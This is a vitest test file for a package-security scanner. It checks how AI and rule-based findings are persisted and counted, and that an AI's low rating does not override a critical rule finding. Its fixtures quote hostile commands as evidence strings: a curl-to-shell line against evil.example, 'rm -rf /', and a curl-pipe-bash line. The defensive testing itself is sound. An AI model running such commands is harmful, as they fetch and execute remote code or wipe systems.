import { env } from "cloudflare:test";
import { eq } from "drizzle-orm";
import { describe, expect, test } from "vitest";
import { createDb } from "../../server/db/client";
import { ensurePersonalOrganization } from "../../server/db/organizations";
import { claimScanForRun, createScanJob, getScan, persistScan } from "../../server/db/scans";
import * as schema from "../../server/db/schema";
import {
  DETERMINISTIC_RULES_VERSION,
  createPackageDiff,
} from "../../server/lib/review";
import type { ScanRiskBreakdown } from "../../server/lib/risk";
import {
  loadScanArtifacts,
  writeScanArtifacts,
} from "../../server/lib/scan-artifacts";
import { sha256Hex, stableJson } from "../../server/lib/stable-json";

async function seedUserAndOrg() {
  const db = createDb(env.DB);
  const now = new Date();
  const userId = `user_${crypto.randomUUID()}`;
  await db.insert(schema.user).values({
    id: userId,
    name: "AI Findings Tester",
    email: `${userId}@example.com`,
    emailVerified: true,
    createdAt: now,
    updatedAt: now,
  });
  const organizationId = await ensurePersonalOrganization(db, { userId });
  return { db, userId, organizationId };
}

const completeAiReview = {
  status: "complete" as const,
  risk: "critical" as const,
  releaseAssessment: "blocked" as const,
  summary: "Found a critical issue.",
  findings: [
    {
      severity: "critical" as const,
      file: "postinstall.js",
      evidence: 'exec("curl http://evil.example/shell | sh")',
      reason: "Downloads and executes a remote shell script on install.",
      recommendation: "Remove the postinstall script entirely.",
    },
  ],
  requiresManualReview: true,
  model: "test-model",
};

const disabledAiReview = {
  status: "unavailable" as const,
  risk: "low" as const,
  releaseAssessment: "not_assessed" as const,
  summary: "AI review is disabled.",
  findings: [],
  requiresManualReview: false,
  model: null,
};

describe("AI findings persistence — D1 path", () => {
  test("AI findings get source='ai' rows in scan_findings", async () => {
    const { db, userId, organizationId } = await seedUserAndOrg();
    const scanId = `scan_${crypto.randomUUID()}`;
    const stageId = `stage-ai-${crypto.randomUUID().slice(0, 8)}`;

    await createScanJob(db, { id: scanId, stageId, organizationId, ownerUserId: userId });
    await claimScanForRun(db, scanId, organizationId);

    const result = await persistScan(db, {
      id: scanId,
      stageId,
      organizationId,
      ownerUserId: userId,
      packageJson: { name: "demo", version: "1.0.0" },
      risk: "critical",
      status: "complete",
      summary: {},
      ai: completeAiReview,
      files: [],
      diff: [],
      findings: [],
      aiFindings: completeAiReview.findings,
      report: { version: 1, digest: "digest-ai-d1" },
    });

    expect(result.persisted).toBe(true);

    const findings = await db
      .select()
      .from(schema.scanFindings)
      .where(eq(schema.scanFindings.scanId, scanId));

    expect(findings).toHaveLength(1);
    expect(findings[0]?.source).toBe("ai");
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.file).toBe("postinstall.js");
    expect(findings[0]?.ruleId).toBeNull();
    expect(findings[0]?.ruleVersion).toBeNull();
  });

  test("findingCount includes AI findings", async () => {
    const { db, userId, organizationId } = await seedUserAndOrg();
    const scanId = `scan_${crypto.randomUUID()}`;
    const stageId = `stage-ai-count-${crypto.randomUUID().slice(0, 8)}`;

    await createScanJob(db, { id: scanId, stageId, organizationId, ownerUserId: userId });
    await claimScanForRun(db, scanId, organizationId);

    await persistScan(db, {
      id: scanId,
      stageId,
      organizationId,
      ownerUserId: userId,
      packageJson: { name: "demo", version: "1.0.0" },
      risk: "critical",
      status: "complete",
      summary: {},
      ai: completeAiReview,
      files: [],
      diff: [],
      findings: [
        // one rule finding
        {
          severity: "medium",
          file: "build.js",
          evidence: "native addon build",
          reason: "install script",
          ruleId: "install-script.implicit-node-gyp",
          ruleVersion: DETERMINISTIC_RULES_VERSION,
        },
      ],
      aiFindings: completeAiReview.findings, // one AI finding
      report: { version: 1, digest: "digest-ai-count" },
    });

    const [scan] = await db
      .select({ findingCount: schema.scans.findingCount })
      .from(schema.scans)
      .where(eq(schema.scans.id, scanId))
      .limit(1);

    // 1 rule + 1 AI = 2
    expect(scan?.findingCount).toBe(2);
  });

  test("getScan returns AI findings alongside rule findings", async () => {
    const { db, userId, organizationId } = await seedUserAndOrg();
    const scanId = `scan_${crypto.randomUUID()}`;
    const stageId = `stage-ai-getscan-${crypto.randomUUID().slice(0, 8)}`;

    await createScanJob(db, { id: scanId, stageId, organizationId, ownerUserId: userId });
    await claimScanForRun(db, scanId, organizationId);

    await persistScan(db, {
      id: scanId,
      stageId,
      organizationId,
      ownerUserId: userId,
      packageJson: { name: "demo", version: "1.0.0" },
      risk: "critical",
      status: "complete",
      summary: {},
      ai: completeAiReview,
      files: [],
      diff: [],
      findings: [],
      aiFindings: completeAiReview.findings,
      report: { version: 1, digest: "digest-ai-getscan" },
    });

    const detail = await getScan(db, scanId, organizationId);
    expect(detail).not.toBeNull();
    expect(detail!.findings).toHaveLength(1);
    expect(detail!.findings[0]?.source).toBe("ai");
  });

  test("riskSummaryJson.contextFindingCount includes AI findings", async () => {
    const { db, userId, organizationId } = await seedUserAndOrg();
    const scanId = `scan_${crypto.randomUUID()}`;
    const stageId = `stage-ai-risk-${crypto.randomUUID().slice(0, 8)}`;

    await createScanJob(db, { id: scanId, stageId, organizationId, ownerUserId: userId });
    await claimScanForRun(db, scanId, organizationId);

    const riskSummary: ScanRiskBreakdown = {
      artifactRisk: "critical",
      releaseRisk: "critical",
      contextRisk: "low",
      releaseFindingCount: 0,
      // Pre-adjusted to include 1 AI finding as context (as scan-pipeline-phases does)
      contextFindingCount: 1,
      unknownFindingCount: 0,
    };

    await persistScan(db, {
      id: scanId,
      stageId,
      organizationId,
      ownerUserId: userId,
      packageJson: { name: "demo", version: "1.0.0" },
      risk: "critical",
      status: "complete",
      summary: { risk: riskSummary },
      ai: completeAiReview,
      files: [],
      diff: [],
      findings: [],
      aiFindings: completeAiReview.findings,
      riskSummary,
      report: { version: 1, digest: "digest-ai-risk" },
    });

    const [scan] = await db
      .select({ riskSummaryJson: schema.scans.riskSummaryJson })
      .from(schema.scans)
      .where(eq(schema.scans.id, scanId))
      .limit(1);

    const summary = scan?.riskSummaryJson as ScanRiskBreakdown | null;
    expect(summary?.contextFindingCount).toBe(1);
    expect(summary?.artifactRisk).toBe("critical");
  });

  test("AI findings do not downgrade deterministic critical risk", async () => {
    const { db, userId, organizationId } = await seedUserAndOrg();
    const scanId = `scan_${crypto.randomUUID()}`;
    const stageId = `stage-ai-nodown-${crypto.randomUUID().slice(0, 8)}`;

    await createScanJob(db, { id: scanId, stageId, organizationId, ownerUserId: userId });
    await claimScanForRun(db, scanId, organizationId);

    // Deterministic rule says critical; AI says low / nothing_unusual.
    const lowAiReview = {
      ...disabledAiReview,
      status: "complete" as const,
      risk: "low" as const,
      releaseAssessment: "nothing_unusual" as const,
      model: "test-model",
    };

    const riskSummary: ScanRiskBreakdown = {
      artifactRisk: "critical",
      releaseRisk: "critical",
      contextRisk: "critical",
      releaseFindingCount: 1,
      contextFindingCount: 0,
      unknownFindingCount: 0,
    };

    await persistScan(db, {
      id: scanId,
      stageId,
      organizationId,
      ownerUserId: userId,
      packageJson: { name: "demo", version: "1.0.0" },
      risk: "critical",
      status: "complete",
      summary: { risk: riskSummary },
      ai: lowAiReview,
      files: [],
      diff: createPackageDiff([], []),
      findings: [
        {
          severity: "critical",
          file: "evil.js",
          evidence: "rm -rf /",
          reason: "destroys filesystem",
          ruleId: "code.dangerous-command",
          ruleVersion: DETERMINISTIC_RULES_VERSION,
        },
      ],
      aiFindings: [], // AI found nothing
      riskSummary,
      report: { version: 1, digest: "digest-no-downgrade" },
    });

    const [scan] = await db
      .select({ risk: schema.scans.risk, riskSummaryJson: schema.scans.riskSummaryJson })
      .from(schema.scans)
      .where(eq(schema.scans.id, scanId))
      .limit(1);

    expect(scan?.risk).toBe("critical");
    const summary = scan?.riskSummaryJson as ScanRiskBreakdown | null;
    expect(summary?.artifactRisk).toBe("critical");
    expect(summary?.releaseRisk).toBe("critical");
  });
});

describe("AI findings persistence — R2 artifact path", () => {
  test("loadScanArtifacts returns AI findings with source='ai' from report JSON", async () => {
    const { db, userId, organizationId } = await seedUserAndOrg();
    const scanId = `scan_${crypto.randomUUID()}`;
    const stageId = `stage-ai-r2-${crypto.randomUUID().slice(0, 8)}`;
    const diff = createPackageDiff([], []);

    const reportPayload = {
      version: 1,
      rulesVersion: DETERMINISTIC_RULES_VERSION,
      stageId,
      stagedPublish: null,
      package: { name: "demo", stagedVersion: "1.0.0", stagedTag: "latest", previousVersion: null },
      baseline: null,
      fileCount: 0,
      previousFileCount: 0,
      packageJson: null,
      packageJsonDiff: {},
      diff,
      ruleFindings: [],
      findingAnnotations: [],
      aiFindings: completeAiReview,
      risk: {
        artifactRisk: "critical",
        releaseRisk: "critical",
        contextRisk: "low",
        releaseFindingCount: 0,
        contextFindingCount: 1,
        unknownFindingCount: 0,
      },
      safety: {
        tokenExposedToSandbox: false,
        directSandboxNetwork: false,
        outboundPolicy: "test",
        aiInputPolicy: "test",
        fileExplorerPolicy: "test",
      },
    };
    const reportJson = stableJson(reportPayload);
    const reportDigest = await sha256Hex(reportJson);

    const artifacts = await writeScanArtifacts(env.ARTIFACTS, {
      organizationId,
      scanId,
      reportJson,
      reportDigest,
      files: [],
      diff,
      generatedAt: "2026-07-18T00:00:00.000Z",
    });

    // Persist with the artifact metadata so getScan uses the R2 path.
    await createScanJob(db, { id: scanId, stageId, organizationId, ownerUserId: userId });
    await claimScanForRun(db, scanId, organizationId);
    await persistScan(db, {
      id: scanId,
      stageId,
      organizationId,
      ownerUserId: userId,
      packageJson: { name: "demo", version: "1.0.0" },
      risk: "critical",
      status: "complete",
      summary: {},
      ai: completeAiReview,
      files: [],
      diff,
      findings: [],
      // No aiFindings here — the R2 report is the source of truth for findings.
      report: { version: 1, digest: reportDigest },
      artifacts,
    });

    const scanRow = (
      await db
        .select()
        .from(schema.scans)
        .where(eq(schema.scans.id, scanId))
        .limit(1)
    )[0]!;

    const detail = await loadScanArtifacts(env.ARTIFACTS, scanRow);
    expect(detail).not.toBeNull();
    expect(detail!.findings).toHaveLength(1);
    expect(detail!.findings[0]?.source).toBe("ai");
    expect(detail!.findings[0]?.severity).toBe("critical");
    expect(detail!.findings[0]?.file).toBe("postinstall.js");
    expect(detail!.findings[0]?.ruleId).toBeNull();
  });

  test("loadScanArtifacts returns both rule and AI findings when both are present", async () => {
    const { db, userId, organizationId } = await seedUserAndOrg();
    const scanId = `scan_${crypto.randomUUID()}`;
    const stageId = `stage-ai-r2-mixed-${crypto.randomUUID().slice(0, 8)}`;
    const diff = createPackageDiff([], []);

    const reportPayload = {
      version: 1,
      rulesVersion: DETERMINISTIC_RULES_VERSION,
      stageId,
      stagedPublish: null,
      package: { name: "demo", stagedVersion: "2.0.0", stagedTag: "latest", previousVersion: null },
      baseline: null,
      fileCount: 0,
      previousFileCount: 0,
      packageJson: null,
      packageJsonDiff: {},
      diff,
      ruleFindings: [
        {
          severity: "medium",
          file: "scripts/build.sh",
          evidence: "curl http://example.com | bash",
          reason: "downloads and executes remote code",
          ruleId: "code.dangerous-command",
          ruleVersion: DETERMINISTIC_RULES_VERSION,
        },
      ],
      findingAnnotations: [{ findingIndex: 0, diffStatus: "added", releaseDelta: true }],
      aiFindings: completeAiReview,
      risk: {
        artifactRisk: "critical",
        releaseRisk: "critical",
        contextRisk: "medium",
        releaseFindingCount: 1,
        contextFindingCount: 1,
        unknownFindingCount: 0,
      },
      safety: {
        tokenExposedToSandbox: false,
        directSandboxNetwork: false,
        outboundPolicy: "test",
        aiInputPolicy: "test",
        fileExplorerPolicy: "test",
      },
    };
    const reportJson = stableJson(reportPayload);
    const reportDigest = await sha256Hex(reportJson);

    const artifacts = await writeScanArtifacts(env.ARTIFACTS, {
      organizationId,
      scanId,
      reportJson,
      reportDigest,
      files: [],
      diff,
      generatedAt: "2026-07-18T00:00:00.000Z",
    });

    await createScanJob(db, { id: scanId, stageId, organizationId, ownerUserId: userId });
    await claimScanForRun(db, scanId, organizationId);
    await persistScan(db, {
      id: scanId,
      stageId,
      organizationId,
      ownerUserId: userId,
      packageJson: { name: "demo", version: "2.0.0" },
      risk: "critical",
      status: "complete",
      summary: {},
      ai: completeAiReview,
      files: [],
      diff,
      findings: [],
      report: { version: 1, digest: reportDigest },
      artifacts,
    });

    const scanRow = (
      await db
        .select()
        .from(schema.scans)
        .where(eq(schema.scans.id, scanId))
        .limit(1)
    )[0]!;

    const detail = await loadScanArtifacts(env.ARTIFACTS, scanRow);
    expect(detail).not.toBeNull();
    expect(detail!.findings).toHaveLength(2);

    const sources = detail!.findings.map((f) => f.source).sort();
    expect(sources).toEqual(["ai", "rule"]);

    const ruleFinding = detail!.findings.find((f) => f.source === "rule");
    expect(ruleFinding?.ruleId).toBe("code.dangerous-command");
    expect(ruleFinding?.severity).toBe("medium");

    const aiFinding = detail!.findings.find((f) => f.source === "ai");
    expect(aiFinding?.severity).toBe("critical");
    expect(aiFinding?.ruleId).toBeNull();
  });
});
